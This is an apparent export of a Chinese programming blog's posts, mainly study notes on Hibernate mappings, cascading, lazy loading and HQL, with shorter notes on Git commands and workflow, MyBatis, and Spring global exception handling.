&lt;!-- 如果想要使用getCurrentSession，需要配置上下文--&gt; &lt;property name=&quot;current_session_context_class&quot;&gt;thread&lt;/property&gt; &lt;!--是否自动生成数据表--&gt; &lt;property name=&quot;hibernate.hbm2ddl.auto&quot;&gt;update&lt;/property&gt; &lt;!--为每一个映射配置文件配置寻找路径--&gt; &lt;!-- 指定 mapping 配置文件方式，注解方式 --&gt; &lt;mapping resource=&quot;mapping/usermapping.hbm.xml&quot;/&gt; &lt;/session-factory&gt;&lt;/hibernate-configuration&gt; hbm2ddl.auto自动生成表 **==update==**：如果有则不改，如果没有就按照 model 生成； **==validate==**：model 类和表得一致，不一致就报错； create：每次执行都按照 model 类生成表，会造成数据丢失； create-drop：每次执行按照 model 类生成表，执行完删掉数据库表。 创建实体类123456789101112package com.ishangu.model;import lombok.Data;import java.util.Set;@Datapublic class Customer &#123; private Integer id ; private String name ; private Set&lt;Orders&gt; orders ;&#125; 12345678910package com.ishangu.model;import lombok.Data;@Datapublic class Orders &#123; private Integer id ; private String name ; private Customer customer ;&#125; 实体关系==映射文件配置==需要为每一个实体文件建立映射文件，完成实体类关系映射，以及字段和属性映射等等。 ==Hibernate关注的是 java 类（model类）直接和 数据库（表，字段）关联，而不是与结果集；== ==因此，配置的时候一般都是先指定 java（类名，属性名）对应 数据库（表名，字段名，外键名）== 命名为：People.hbm.xml &lt;hibernate-mapping&gt; package：可以配置package=&quot;com.ishangu.model&quot;指定包名，往后配置 class 的 name 就可以省略包名。 schema：数据库 schema 的名称； catalog：数据库 catalog 的名称； default-cascade：默认的级联关系，默认为 none； default-access：Hibernate 用来访问属性的策略； default-lazy：指定了未注明 lazy 属性的 Java 属性的集合类，Hibernate 会采用什么样的加载风格（默认懒加载），默认 true。 auto-inport：指定我们是否可以在查询语句中，使用非全限定名，默认为 true，如果是项目中有两个同名的持久化类，最好在两个类的对应映射文件中配置为false。 &lt;class&gt; name：实体类名称； table：数据库表名； schema：数据库 schema 的名称，会覆盖 hibernate-mapping 的 schema； catalog：数据库 catalog 的名称； proxy：指定一个接口，在延迟加载时作为代理使用； dynamic-update：动态更新；update set 的时候，SQL 语句只会更新修改后的字段； dynamic-insert：动态添加；添加的时候，如果不采用动态添加，会为所有字段设值（values），即使为空；如果添加动态添加，插入的持久化对象的时候==哪些字段不为空，就只存哪些字段==； where：查询时添加条件；比如查询所有状态为1（正常）的用户，避免每次查询都得添加该条件，可以配置一个 where 追加条件（where=”status = 1”）。 &lt;id&gt; name：实体类属性名； type：实体类属性数据类型； column：数据表的主键字段名； generator：主键生成策略； hilo 算法； increment：Hibernate 自增； ==identit==y：数据库自增； ==native==：本地策略，根据底层数据库自动选择主键生成策略； uuid.hex 算法； select 算法。 &lt;property&gt; name：实体类属性名； column：数据表字段名； type：数据类型； update：该字段是否可以修改，默认为 true； insert：该字段是否可以添加，默认为 true； lazy：懒加载； 12345678910111213141516171819202122&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE hibernate-mapping PUBLIC &quot;-//Hibernate/Hibernate Mapping DTD 3.0//EN&quot; &quot;http://hibernate.sourceforge.net/hibernate-mapping-3.0.dtd&quot;&gt;&lt;hibernate-mapping&gt; &lt;class name=&quot;com.ishangu.model.People&quot; table=&quot;people&quot;&gt; &lt;id name=&quot;id&quot; type=&quot;java.lang.Integer&quot;&gt; &lt;!--对应表的主键--&gt; &lt;column name=&quot;id&quot;&gt;&lt;/column&gt; &lt;!--主键自增方式--&gt; &lt;generator class=&quot;identity&quot;&gt;&lt;/generator&gt; &lt;/id&gt; &lt;property name=&quot;name&quot; type=&quot;java.lang.String&quot;&gt; &lt;column name=&quot;name&quot;&gt;&lt;/column&gt; &lt;/property&gt; &lt;property name=&quot;money&quot; type=&quot;java.lang.Double&quot;&gt; &lt;column name=&quot;money&quot;&gt;&lt;/column&gt; &lt;/property&gt; &lt;/class&gt;&lt;/hibernate-mapping&gt; 级联属性### ==insert== 在一对多关系中，一方的 POJO 需要配置多方的 Set 集合，同时在配置文件中添加 &lt;set&gt; 标签； 同时，多方也需要在配置文件中添加many-to-one标签； 多方，一方，都在==同时维护一对多的一个关系，就会造成重复==； 避免策略：一般我们采用只让多方来维护一对多关系，在一方的&lt;set&gt;标签中设置 insert 属性为 true —— ==将关系维护权交给对方==。 默认为 false，双方都在维护； 设置为 true，表示放弃维护； 1234&lt;set name=&quot;orders&quot; table=&quot;orders&quot; lazy=&quot;extra&quot; inverse=&quot;true&quot;&gt; &lt;key column=&quot;c_id&quot;&gt;&lt;/key&gt; &lt;one-to-many class=&quot;com.ishangu.model.Orders&quot;&gt;&lt;/one-to-many&gt;&lt;/set&gt; 1234567891011121314151617181920212223242526272829303132333435/** * 测试 insert 级联关系属性 */ @Test public void testMethod5() &#123; Configuration conf = new Configuration().configure() ; SessionFactory sessionFactory = conf.buildSessionFactory() ; Session session = sessionFactory.openSession(); session.beginTransaction(); Customer customer = new Customer(); customer.setName(&quot;关系客户2&quot;); // 多方维护关系 Orders order1 = new Orders(); order1.setName(&quot;关系订单11&quot;); order1.setCustomer(customer); Orders order2 = new Orders(); order2.setName(&quot;关系订单22&quot;); order2.setCustomer(customer); // 一方再次维护关系（产生重复） Set&lt;Orders&gt; orders = new HashSet&lt;&gt;(); orders.add(order1); orders.add(order2); customer.setOrders(orders); session.save(customer) ; session.save(order1) ; session.save(order2) ; session.getTransaction().commit(); session.close(); &#125; ==&lt;cascade&gt;== 用来设置级联操作：如果删除主表的一条数据，必须同时删除与之相关的所有从表数据。 方法一：需要删除所有从表记录，再去删除主表的一条记录； 方法二：设置&lt;cascade&gt;值为delete，即可；==这样删除主表记录的时候就会自动遍历与之相关得到所有从表的记录==。 1234&lt;set name=&quot;orders&quot; table=&quot;orders&quot; lazy=&quot;extra&quot; inverse=&quot;true&quot; cascade=&quot;delete&quot;&gt; &lt;key column=&quot;c_id&quot;&gt;&lt;/key&gt; &lt;one-to-many class=&quot;com.ishangu.model.Orders&quot;&gt;&lt;/one-to-many&gt;&lt;/set&gt; 注册实体关系映射文件在 Hiberate.cfg.xml 中配置；注意所有配置文件默认需要放置在 resources 文件夹下，或者手动配置 pom.xml 指定 resource； 12&lt;!--注册实体关系映射文件--&gt; &lt;mapping resource=&quot;mapping/People.hbm.xml&quot;&gt;&lt;/mapping&gt; 123456789101112&lt;build&gt; &lt;!--默认情况下，项目只会从 resources 文件夹中寻找 .xml 文件--&gt; &lt;!--我们可以通过配置 pom.xml 下的 build 来改变这一点--&gt; &lt;resources&gt; &lt;resource&gt; &lt;directory&gt;src/main/java&lt;/directory&gt; &lt;includes&gt; &lt;include&gt;**/*.xml&lt;/include&gt; &lt;/includes&gt; &lt;/resource&gt; &lt;/resources&gt;&lt;/build&gt; 使用Hiberate API 操作 读取配置（==需要 new Configuration().configure() 后面这个方法调用不可少==） 不加.configure() 是读取 .property 配置文件； 添加.configure() 是读取 .cfg.xml 配置文件。 建造工厂 打开会话（同GIT缓存区，管理的持久性对象会同步到本地数据库） 开启事物（同数据库事务，具有原子性，一旦中途出错，整个提交都会失败）； 获取、修改映射对象（可以通过各种方式操作数据） 提交事物 关闭会话 1234567891011121314151617181920212223@Test public void testMethod1() &#123; // 构造方法，可以指定 hibernate.cfg.xml 文件名称，也可以不指定采用默认 Configuration configuration = new Configuration().configure(); // 获取 SessionFactory sessionFactory SessionFactory sessionFactory = configuration.buildSessionFactory() ; // 获取 Session Session session = sessionFactory.openSession() ; // 开启事物 Transaction tr = session.beginTransaction(); // 新建一个对象，将其保存到 Seesion 缓存中 // 被 Session 管理的对象为持久态，该状态文件，在提交事件后，会同步到本地数据库 People people = new People() ; people.setName(&quot;张三&quot;) ; people.setMoney(1000.0) ; session.save(people) ; // 提交事物 session.getTransaction().commit(); // 关闭session session.close(); &#125; 级联操作一对多​ 车和人：一个人名下可以有多辆车，但是一辆车最多属于一个人； ​ 订单和客户：一个订单只能属于一个客户，但是一个客户可以有多个订单； 数据库实现： ==一方为主表==，多方为从表，通过主外键来维护关联（多方设置外键，并参考到多方的主键）。 1234567891011121314151617181920212223242526drop table if exists customer;create table customer( id int primary key auto_increment , name varchar(20) not null);insert into customer values(null, &#x27;方宁&#x27;);insert into customer values(null, &#x27;开心超人&#x27;);insert into customer values(null, &#x27;大大怪&#x27;);insert into customer values(null, &#x27;小小怪&#x27;);drop table if exists orders;create table orders( id int primary key auto_increment , name varchar(20) not null, c_id int , constraint orders_fk_customer foreign key(c_id) references customer(id));insert into orders values(null, &#x27;订单1&#x27;, 1);insert into orders values(null, &#x27;订单2&#x27;, 2);insert into orders values(null, &#x27;订单3&#x27;, 3);insert into orders values(null, &#x27;订单4&#x27;, 4);insert into orders values(null, &#x27;订单5&#x27;, 1);insert into orders values(null, &#x27;订单6&#x27;, 1); java实现 多的一方，简单 java 类中，添加 1 的一方类型的集合。（Set集合、List集合）； 1 方一方，简单 java 类中，添加多的一方的类型对象（Customer customer）。 配置关系 一方：Customer.hbm.xml set 配置实体类中，集合属性 orders； name，实体类属性名； table，数据来源表； key，数据来源表中与之关联的外籍字段； one-to-many，==配置实体类对应的泛型集合属性==（将来源表，映射为集合泛型实体类）。 将 table 中的表，映射为 one-to-many 中的类型，然后根据 key 装到 set 中。 12345678910111213141516171819202122232425262728293031&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE hibernate-mapping PUBLIC &quot;-//Hibernate/Hibernate Mapping DTD 3.0//EN&quot; &quot;http://hibernate.sourceforge.net/hibernate-mapping-3.0.dtd&quot;&gt;&lt;hibernate-mapping&gt; &lt;class name=&quot;com.ishangu.model.Customer&quot; table=&quot;customer&quot;&gt; &lt;id name=&quot;id&quot; type=&quot;java.lang.Integer&quot;&gt; &lt;!--对应表的主键--&gt; &lt;column name=&quot;id&quot;&gt;&lt;/column&gt; &lt;!--主键自增方式--&gt; &lt;generator class=&quot;identity&quot;&gt;&lt;/generator&gt; &lt;/id&gt; &lt;property name=&quot;name&quot; type=&quot;java.lang.String&quot;&gt; &lt;column name=&quot;name&quot;&gt;&lt;/column&gt; &lt;/property&gt; &lt;!--半自动化：MyBatis 是将查询结果集，和对象映射--&gt; &lt;!--全自动化：Hibernate 是将对象和表进行映射--&gt; &lt;!--配置对象，关联属性，数据来源定位到对应表--&gt; &lt;set name=&quot;orders&quot; table=&quot;orders&quot;&gt; &lt;!--指定数据来源的表的哪一个字段进行关联（外键就是关系）--&gt; &lt;key column=&quot;c_id&quot;&gt;&lt;/key&gt; &lt;!--指定注入的表所对应的java类型--&gt; &lt;one-to-many class=&quot;com.ishangu.model.Orders&quot;&gt;&lt;/one-to-many&gt; &lt;/set&gt; &lt;/class&gt;&lt;/hibernate-mapping&gt; 多方：Oerder.hbm.xml many-to-one（==配置实体类对应的对象属性==） name：属性名； class：属性对应的类型； column：属性对应从表关联外键； 123456789101112131415161718192021222324&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE hibernate-mapping PUBLIC &quot;-//Hibernate/Hibernate Mapping DTD 3.0//EN&quot; &quot;http://hibernate.sourceforge.net/hibernate-mapping-3.0.dtd&quot;&gt;&lt;hibernate-mapping&gt; &lt;class name=&quot;com.ishangu.model.Customer&quot; table=&quot;orders&quot;&gt; &lt;id name=&quot;id&quot; type=&quot;java.lang.Integer&quot;&gt; &lt;!--对应表的主键--&gt; &lt;column name=&quot;id&quot;&gt;&lt;/column&gt; &lt;!--主键自增方式--&gt; &lt;generator class=&quot;identity&quot;&gt;&lt;/generator&gt; &lt;/id&gt; &lt;property name=&quot;name&quot; type=&quot;java.lang.String&quot;&gt; &lt;column name=&quot;name&quot;&gt;&lt;/column&gt; &lt;/property&gt; &lt;!--多方是从方，只需要指定实体类属性名，数据表关联字段，实体类解析类型--&gt; &lt;many-to-one name=&quot;customer&quot; column=&quot;c_id&quot; class=&quot;com.ishangu.model.Customer&quot;&gt;&lt;/many-to-one&gt; &lt;/class&gt;&lt;/hibernate-mapping&gt; 测试 直接就是操作 Session 持久化对象； 增删改查，建立关系，都是对 Java 对象进行操作，然后转化为 Session 持久态。 123456789101112131415161718192021222324252627282930/** * 测试一对多 */ @Test public void testMethod2() &#123; Configuration conf = new Configuration().configure() ; SessionFactory sessionFactory = conf.buildSessionFactory() ; Session session = sessionFactory.openSession() ; session.beginTransaction(); // 插入数据 Customer customer = new Customer(); customer.setName(&quot;李四&quot;); Orders orders = new Orders(); orders.setName(&quot;李四的订单1&quot;); // 临时态 —— 建立关联关系 // 这一步，自动会在数据库建立关联外键 orders.setCustomer(customer); // 转持久态 session.save(customer) ; session.save(orders) ; // 提交同步到数据库 session.getTransaction().commit(); session.close(); &#125; 多对多​ 学生选课：一个学生可以选择多门课程，一门课程也可以有多个学生学习； 数据库实现 通过两个一对多的关系来实现多对多关系；==建立一张中间表，作为多方表；两张实体表作为两个1方表；== ==课程、学生为主表，也就是一方表；中间表为从表，设置两个外键为联合主键。== 12345678910111213141516171819202122232425262728293031323334353637383940414243# 多对多（学生-课程）drop table if exists hiber.course;create table hiber.course( id int primary key auto_increment , name varchar(20) not null);insert into hiber.course values (null, &#x27;数据库&#x27;);insert into hiber.course values (null, &#x27;Java&#x27;);insert into hiber.course values (null, &#x27;数据结构与算法&#x27;);insert into hiber.course values (null, &#x27;Python&#x27;);insert into hiber.course values (null, &#x27;C&#x27;);drop table if exists hiber.student;create table hiber.student( id int primary key auto_increment , name varchar(20) not null);insert into hiber.student values (null, &#x27;阿方&#x27;);insert into hiber.student values (null, &#x27;阿威&#x27;);insert into hiber.student values (null, &#x27;阿福&#x27;);insert into hiber.student values (null, &#x27;常威&#x27;);insert into hiber.student values (null, &#x27;常福&#x27;);insert into hiber.student values (null, &#x27;大牛&#x27;);drop table if exists hiber.student_course;create table hiber.student_course( stu_id int, constraint student_course_fk_student foreign key(stu_id) references hiber.student(id) , c_id int, constraint student_course_fk_course foreign key(c_id) references hiber.course(id) , constraint student_course_pk primary key(stu_id, c_id));insert into hiber.student_course values (1, 1);insert into hiber.student_course values (2, 2);insert into hiber.student_course values (3, 3);insert into hiber.student_course values (4, 4);insert into hiber.student_course values (5, 5);insert into hiber.student_course values (1, 2);insert into hiber.student_course values (1, 4);insert into hiber.student_course values (2, 1);insert into hiber.student_course values (2, 3); java实现 在两个多对多主题类，分别都将其看作为单方，==设置对方的类型集合（Set、List）。== 12345678910111213package com.ishangu.model;import lombok.Data;import java.util.Set;@Datapublic class Student &#123; private Integer id ; private String name ; private Set&lt;Course&gt; courses ;&#125; 123456789101112package com.ishangu.model;import lombok.Data;import java.util.Set;@Datapublic class Course &#123; private Integer id ; private String name ; private Set&lt;Student&gt; students ;&#125; 配置关系 many-to-many 来给实体类属性指定数据源；需要配置 column 指定数据源对应表在中间表的外键。 Student.hbm.xml 12345678910111213141516171819202122232425262728&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE hibernate-mapping PUBLIC &quot;-//Hibernate/Hibernate Mapping DTD 3.0//EN&quot; &quot;http://hibernate.sourceforge.net/hibernate-mapping-3.0.dtd&quot;&gt;&lt;hibernate-mapping&gt; &lt;class name=&quot;com.ishangu.model.Student&quot; table=&quot;student&quot;&gt; &lt;id name=&quot;id&quot; type=&quot;java.lang.Integer&quot;&gt; &lt;!--对应表的主键--&gt; &lt;column name=&quot;id&quot;&gt;&lt;/column&gt; &lt;!--主键自增方式--&gt; &lt;generator class=&quot;identity&quot;&gt;&lt;/generator&gt; &lt;/id&gt; &lt;property name=&quot;name&quot; type=&quot;java.lang.String&quot;&gt; &lt;column name=&quot;name&quot;&gt;&lt;/column&gt; &lt;/property&gt; &lt;!--从student_course表找--&gt; &lt;set name=&quot;courses&quot; table=&quot;student_course&quot;&gt; &lt;!--用 stu_id 与该表关联--&gt; &lt;key column=&quot;stu_id&quot;&gt;&lt;/key&gt; &lt;!-- 指定实体类，以及实体类从中间表所关联的哪个表来 --&gt; &lt;many-to-many class=&quot;com.ishangu.model.Course&quot; column=&quot;c_id&quot;&gt;&lt;/many-to-many&gt; &lt;/set&gt; &lt;/class&gt;&lt;/hibernate-mapping&gt; Course.hbm.xml 123456789101112131415161718192021222324&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE hibernate-mapping PUBLIC &quot;-//Hibernate/Hibernate Mapping DTD 3.0//EN&quot; &quot;http://hibernate.sourceforge.net/hibernate-mapping-3.0.dtd&quot;&gt;&lt;hibernate-mapping&gt; &lt;class name=&quot;com.ishangu.model.Course&quot; table=&quot;course&quot;&gt; &lt;id name=&quot;id&quot; type=&quot;java.lang.Integer&quot;&gt; &lt;!--对应表的主键--&gt; &lt;column name=&quot;id&quot;&gt;&lt;/column&gt; &lt;!--主键自增方式--&gt; &lt;generator class=&quot;identity&quot;&gt;&lt;/generator&gt; &lt;/id&gt; &lt;property name=&quot;name&quot; type=&quot;java.lang.String&quot;&gt; &lt;column name=&quot;name&quot;&gt;&lt;/column&gt; &lt;/property&gt; &lt;set name=&quot;students&quot; table=&quot;student_course&quot;&gt; &lt;key column=&quot;c_id&quot;&gt;&lt;/key&gt; &lt;many-to-many class=&quot;com.ishangu.model.Student&quot; column=&quot;stu_id&quot;&gt;&lt;/many-to-many&gt; &lt;/set&gt; &lt;/class&gt;&lt;/hibernate-mapping&gt; 懒加载​ 也叫延迟加载、惰性加载、懒加载。使用==懒加载可以提高程序运行效率==，Java 程序与数据库交互的频次越低，程序运行的效率也就越高。所以我们应该尽量减少 java 程序与数据库的交互次数，Hibernate 延迟加载就很好的做到了这一点。 ​ ==只有持久化对象，才能进行懒加载（也就是查询出来的对象，提交事物之前）。== 概念一对多，或者多对多查询表信息的时候，因为有级联存在，每次查询都会携带==将其所关联的表的数据也一并得到，这样就会多执行一次 SQL 语句==。 懒加载：当我们查询客户信息，而并不访问客户所拥有的订单信息的时候，就不查询订单，就只执行一条 SQL。 ==延迟加载默认开启== Session 查询得到的对象，在 Session 关闭之前，处于 Session 管理的持久态。 持久状态的对象，会拥有懒加载特性，如果不访问关联属性，那么就不会查询关联属性数据。 ==编写 java POJO 类的时候，toStirng 方法最好别带输出关联对象，否则可能会造成两个类得到 toString 方法互相调用，进入死循环！== 设置 lazy 值在实体类配置文件的对应的关联对象属性配置标签内，配置 lazy 属性。 true（默认）：开启懒加载； false（不推荐）：关闭懒加载； ==extra（推荐）==：更加智能，更加懒的懒加载。如果你只是查询结果集的 size，那么他就不会查询所有数据，而是采用 count(id) 的方式，得到结果集条目数。 no-proxy：同 lazy=true，就是懒加载； proxy：同 lazy=false，无懒加载。 测试 在一方的 Customer.hbm.xml 配置文件中，给 set 标签添加lazy=true； 123456789101112131415161718// 测试延迟加载@Testpublic void testMethod4() &#123; Configuration conf = new Configuration().configure() ; SessionFactory sessionFactory = conf.buildSessionFactory() ; Session session = sessionFactory.openSession(); session.beginTransaction(); // 查询一条客户信息，但是不加载订单信息 Customer customer = session.get(Customer.class, 1); // 这条语句只会执行一条 SQL ，因为并没有访问关联属性 System.out.println(customer); // 这里会进入死循环，因为 toString 方法，会相互调用 toString // 这条语句会执行两条 SQL ，因为多查了关联对象数据 System.out.println(customer.getOrders()); session.close();&#125; 如果，关联属性配置 lazy=&quot;false&quot;，关闭；那么无论是否用到关联属性，都会查询两条 SQL 语句（性能较低）。 配置lazy=&quot;extra&quot;，查询实体对象属性集合的 size，那么只会采用查询大小的 SQL 查询。 ==HQL==​ Hibernate Query Language，是 Hibernate 框架提供的一种查询机制，他和 SQL 类似，不同的是 HQL 是面向对象的查询语句，让开发者能够以面向对象的查询语句，让开发者能够以面向对象的思想来编写查询语句，对 Java 编程是一种友好的方式。 ​ HQL 不能直接参与数据库的交互，是一种中间层语言，最终还是转化为 SQL 语言进行执行。 ​ Java -&gt; HQL -&gt; Hibernate -&gt; SQL -&gt; DB ​ HQL 只能完成查询，修改，删除；**==不能完成新增操作。==** 查询 HQL 语句以from 开头，省略 select，所有的联表都是使用类名，而不是表名。 使用 Sessioin 创建 Query 对象，使用哦 Query 执行 HQL； ==获取结果集列表== Query.list() ==分页查询== setFirstResult()：设置第一条结果集下标（起始下标）； setMaxResult()：设置需要的结果集长度； ==where条件查询== HQL 后直接加条件，同 SQL 语句； ==多条：==query.list() ； ==一条：==query.uniqueResult() ，如果结果集为空，不会抛异常； ==模糊查询== from People name like &#39;%张%&#39;； ==排序== from People order by 默认升序，或者添加asc； 添加desc为降序。 ==部分字段查询== select name from People where id=4； 指定的字段，需要为属性名，而不是表字段名。 ==占位符== from People where id = :id and name in (:names) ==设置一个参数==：query.setParameter(&quot;参数名&quot;, &quot;值&quot;)； ==设置多个参数==：query.setParameterList()，可以是集合，可以是数组。 查询所有123456String hql = &quot;from com.ishangu.model.People&quot; ; // 以 from 开头Query query = session.createQuery(hql);List&lt;People&gt; list = query.list() ;for (People people : list) &#123; System.out.println(people);&#125; 分页查询123456789// 分页查询String hql = &quot;from com.ishangu.model.People&quot; ;Query query = session.createQuery(hql) ;query.setFirstResult(1);query.setMaxResults(2);List&lt;People&gt; result = query.list();for (People people : result) &#123; System.out.println(people);&#125; 条件查询123456789101112// 条件查询多条String hql = &quot;from com.ishangu.model.People where id = 4&quot; ;Query query = session.createQuery(hql) ;People people = (People) query.list().get(0);System.out.println(people);---------------------------------// 条件查询一条 query.uniqueResult()String hql = &quot;from com.ishangu.model.People where id = 0&quot; ;Query query = session.createQuery(hql) ;People people = (People) query.uniqueResult();System.out.println(people); 占位符1234567891011121314String hql = &quot;from People where id = :id and (money between :low and :hight) and name in (:names)&quot;;Query query = session.createQuery(hql);query.setInteger(&quot;id&quot;, 4);query.setParameter(&quot;low&quot;, 100.0);query.setParameter(&quot;hight&quot;, 100000.0);query.setParameterList(&quot;names&quot;, new String[]&#123;&quot;王五&quot;, &quot;李四&quot;, &quot;张三&quot;&#125;);List&lt;People&gt; result = query.list();for(People people : result) &#123; System.out.println(people);&#125; ==实体关系对象状态==","link":"","tags":[{"name":"javaWeb","slug":"javaWeb","permalink":"http://www.fangning.xyz.com/tags/javaWeb/"}]},{"title":"Git","date":"2022-02-23T01:19:30.000Z","path":"2022/02/23/2022.02.23 Git/","text":"简介Git 是一个软件，主要用于代码或者文档的版本控制； 功能一个版本控制软件需要包含的功能如下： 1、数据备份，不仅能保持当前目录以及状态，还能保持历史目录和文件状态； 2、多人并行开发； 3、权限管理，对项目的所有开发人员进行权限控制，以及对代码的贡献者进行审核； 4、历史记录，可以查看修改人，修改时间，修改的内容等等。并且，可以根据历史记录将项目恢复到某一个历史状态； 5、版本管理，保证每个版本之间内容不重复，提高内存使用率，Git 采用的是文件系统的快照方式； 6、分支管理，开发人员在各自的分支上进行开发，提升工作效率。 远程仓库​ Git 是一个本地的软件，所有的一切内容都存储在本地计算机之中（本地仓库），是无法与别人共享的，如果想要将内容与别人共享那就需要使用到远程仓库，将数据同步到远程仓库之中，其它开发人员就可以从远程仓库获取。 ​ 以下三种都是 Git 的远程仓库，可以将不同的 Git 用户连接起来多人协作开发以及版本权限的控制。 常用托管平台 GitHub 优点：基于 Git 的国际型仓库、用户群体庞大，代码质量高（含国际性项目）； 缺点：网速慢、免费仓库须开源、闭源需收费； GitLab 可以自己搭建的 Git 仓库（一般用于大型公司内部）； 优点：一般仅支持公司内网访问、安全、免费、速度快； 码云 是一个基于 GitLab 搭建的国内仓库、速度快、支持免费个人私有仓库； 缺点：用户群体较低、企业私有库收费； Git核心概念 1、工作区：就是我们项目目录（代码存放的路径）； 2、暂存区：一般存在于 .git 目录下的 index 文件夹中（git add命令会将文件提交到暂存区）； 3、本地库：本地库存储在 .git 隐藏文件夹中（commit命令会将暂存区代码提交到本地库）； 4、远程库：是指 GitHut、码云、GitLab（push 命令会将本地库更新到远程库）； 5、版本库：.git 隐藏文件夹的 index 文件，是我们在初始化 git 本地库的时候生成的，里面存放了我们==每次commit本地库的所有版本信息==； 步骤 新建工作区 新建一个本地工作区，直接新建一个文件夹，将==项目文件复制==到里面； 初始化本地库 右击工作区，打开 Git 命令行，使用git init初始化该文件夹为Git库。 将库推动到远程库 配置推送人信息（==不带 global 参数就是只针对当前库，全局就是针对所有库==）； git config --global user.name &#39;方宁&#39; git config --global user.email &#39;2215782031@qq.com&#39; 推送人信息，会被远程库记录下来。 选择需要推动的文件（git add *），将其加入暂存区； 提交暂存区文件（git commit [*fileName] -m &#39;推送次数备注&#39;）； 添加远程库（git remote add origin http://gitee.com/mdzzwc/shangu.git）; 上传暂存区文件到指定分支（git push -u origin &quot;master&quot;），输入密码； 注意 若已有本地库，直接添加暂存，提交本地库，提交远程库。 ==连接方式选择== 默认账号密码 最后一步，需要输入远程仓库账号密码； 如果输错（解决方法），需要删除 windows 控制面板-用户-凭证管理器-windows凭证-普通凭证，删除刚刚的远程仓库错误凭证； 使用 SSH 密钥协议验证 如果不想输入账号密码，那就可以通过 SSH 协议远程。原理：==本地 git 生成 ssh 密钥，然后登陆远程仓库配置同样的密钥，下一次 remote 采用 ssh 连接==。 生成本地 ssh 密钥 ssh-keygen -t rsa -C &quot;2215782031@qq.com&quot; 使用该命令，一直回车，生成密钥； 找到密钥保存的本地文件夹，复制文件（id_rsa.pub）中的密钥； 配置远程仓库（以码云为例）ssh 识别密钥 ==将本地生成的密钥，粘贴到码云仓库公共密钥中== Git文件状态​ Git 所谓的版本控制，实际上就是对文件的一个控制，会检测文件是否修改，是否提交等各种信息。每次提交的时候都记录文件的修改时间，在 Git 中文件有 4 种状态。 查看文件状态：git status [文件名] 查看某状态所有文件： git ls-files --o：查看未跟踪； git ls-files --cached：查看暂存； git ls-files --modified：查看已修改； git ls-files --delete：查看删除； 文件状态 Untracked 未跟踪，这个文件在文件夹中，但是没有加入到 Git 库，所以不参与版本控制，通过 add 可以让他变成 staged 暂存状态。 Staged 暂存状态，可以通过 commit 变成 Unmodify（未修改）状态，可以使用 git reset HEAD [文件名]，变成 Untracked（未跟踪） 状态。 Unmodify 文件已入库，未修改，也就是说本地库当前版本的文件与当前文件夹的内容一致，如果修改了会变成修改状态（Modified）。 Modified 文件已修改，可以通过 add 让其变成暂存状态（然后 commit 作用到本地库修改）。 如果不想修改本地库，可以通过 git checkout filename 从库中取出文件，覆盖当前修改（**==本地文件修改，要作用到本地库文件，需要经过缓冲区==**；如果你本地修改完，不想作用到缓冲区，并且想撤销本地的修改，就得从本地库拿备份；此时本地库，就相当于备份功能）。 版本控制​ 正常情况下，我们修改完文件，如果保存后就不能回到之前的版本了。如果使用了 Git 来保存到本地库，每次保存（commit）都会被快照下来，不仅仅做到了备份的作用，还能回到任意一个你保存的时间节点（每次 commit 都生成了一个版本，HEAD 指向当前使用的版本，origin 指向远程库使用的版本）。 操作 用 commit 生成版本； 用 reflog 查看历史版本id； 用 checkout [id] 恢复到对应版本。 相关指令1234567891011121314151617181920211、删除暂存区文件：rm --cached [filename]2、删除本地库文件：rm [filename]3、删除未跟踪文件：git clean -f4、查看本地文件与暂存区的差异：git diff [filename]5、查看暂存区文件与本地库差异：git diff --cached [filename]6、查看本地库版本与前几个版本的差异：git diff HEAD~n # git diff HEAD~^^(前两个)7、签出指定文件：git checkout [fileName]8、签出所有文件：git checkout .9、查看最近版本的详细信息：git log # id 号用于版本恢复 查看所有版本信息：git reflog10、恢复本地库指定版本到工作区：git chekout [版本id] [--filename]","link":"","tags":[{"name":"javaWeb","slug":"javaWeb","permalink":"http://www.fangning.xyz.com/tags/javaWeb/"}]},{"title":"ssm","date":"2022-02-21T08:35:30.000Z","path":"2022/02/21/2022.02.21 SSM/","text":"准备","link":"","tags":[{"name":"javaWeb","slug":"javaWeb","permalink":"http://www.fangning.xyz.com/tags/javaWeb/"}]},{"title":"MyBatis","date":"2022-02-17T06:16:30.000Z","path":"2022/02/17/2022.02.17 MyBitis/","text":"MyBatis​ MyBatis 是一个优秀的持久层框架，它支持定制化 SQL，存储过程以及存储函数等内容。MyBatis 几乎避免了所有的 JDBC 代码以及手动设置参数，结果集解析等。MyBatis可以使用简单的 xml 或注解来配置映射的原生信息，将接口和 Java 的 POJOS（就是） Setting 配置123&lt;setting&gt; &lt;chacheEnabled name=&quot;&quot;&gt;&lt;/chacheEnabled&gt;&lt;/setting&gt;","link":"","tags":[{"name":"javaWeb","slug":"javaWeb","permalink":"http://www.fangning.xyz.com/tags/javaWeb/"}]},{"title":"Spring 全局异常","date":"2022-02-17T01:57:30.000Z","path":"2022/02/17/2022.02.17 全局异常处理/","text":"处理异常​ 在一个比较严谨的项目中，所有的异常都需要记录日志，然后后期维护人员根据日志的记录来进行维护。由于我们目前没有学习日志框架，所以我们只能使用最基本的 IO 流来代替日志框架。 自己编写一个处理异常的类； 12345678910111213141516171819202122public class MyException &#123; @ExceptionHandler(NullPointerException.class) public String nullException(HttpServletRequest req, NullPointerException ex) &#123; // 模拟日志记录 OutputStream out = new FileOutputStream(new File(&quot;E:\\\\err.log&quot;)); StringBuffer sb = new StringBuffer() ; sb.append(&quot;时间：&quot;) ; sb.append(new SimpleDateFormat(&quot;yyyy-MM-dd HH:mm:ss&quot;).format(new Date)) ; sb.sppend(&quot; 请求：&quot; + req.getRequestURI() + &quot;出现空指针异常！\\n&quot;) ; // 将拼接好的异常基本信息压入输出流 out.write(sb.toString().getBytes()) ; out.flush() ; // 打印异常信息 ex.printStackTrace(new PrintWriter(out, true)); out.close() ; // 返回视图 return &quot;err&quot; ; &#125;&#125; 继承实现异常处理 所有需要使用该异常的类，得继承该异常类。 123public class aController extends MyException &#123; &#125; @ControllerAdvice 通知该注解可以作用于所有的 controller。 功能： ==全局异常处理==，只要加上该注解的自定义异常，就可以对所有 controller 进行异常增强。 1234@ControllerAdvicepublic class MyException() &#123; &#125; ==全局参数预处理== 123456789101112131415161718192021@Controlleradvicepublic class SetPrefix() &#123; // 前端数据预处理 